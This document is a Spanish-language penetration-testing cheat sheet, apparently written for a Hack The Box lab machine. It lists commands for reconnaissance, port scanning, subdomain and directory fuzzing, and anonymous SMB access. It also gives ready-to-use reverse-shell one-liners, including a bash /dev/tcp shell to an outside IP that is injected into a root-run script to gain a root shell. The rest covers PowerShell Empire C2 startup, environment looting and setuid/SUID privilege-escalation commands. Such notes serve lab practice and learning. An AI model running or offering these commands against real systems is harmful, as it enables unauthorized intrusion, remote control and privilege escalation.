### INFO-GATHER
whois [DOMINIO] > para la shell
www.who.is º > para consultar en la web.
host [DOMINO] > para ver direcciones IP
dnsrecon -d [WEB] > ver registros DNS

### SCAN TARGET
FASTSCAN: nmap -p- --open -sS -n -Pn --min-rate 5000 $target

### SCAN WEB
gobuster dns -d devvortex.htb -w /usr/share/dnsrecon/subdomains-top1mil.txt -t 200 --no-error >>> SCAN DNS
wfuzz -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302 >> SCAN DNS
gobuster dir -u http://devvortex.htb/ -w /usr/share/dirb/wordlists/big.txt --no-error -t 200 >>> SCAN DIRS
### SMB
smbexec.py 'username:password'@IP > se conecta al objetivo
smbclient -L [HOST] -N > listar shares sin pasar contraseña
smbclient -N //[HOST]/[SHARE] > nos conectamos al share sin pasar contraseña

### EMPIRE POWERSHELL
powershell-empire server > inicia el servidor de empire
powershell-empire client > inicia el cliente

### REVSHELL
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f (DESDE LA PC VICTIMA, PARA ESTABILIZAR)
	echo '#!/bin/bash' > script
	echo 'sh -i >& /dev/tcp/10.10.14.27/443 0>&1' >> script   || SOBREESCRIBIR SCRIPT DE ROOT PARA GENERAR REVSHELL DE ROOT. PJ SUDO.

### LOOT/POSTEXPLO
printenv > imprime las variables de entorno


### PRIVESC 
python3 -c 'import os; os.setuid(0);os.system("/bin/sh")'
find / -perm -u=s -type f 2>/dev/null
find / -type -f -perm -04000 -ls 2>/dev/null

### AGREGAR PATH LINUX
PATH=/RUTA:$PATH
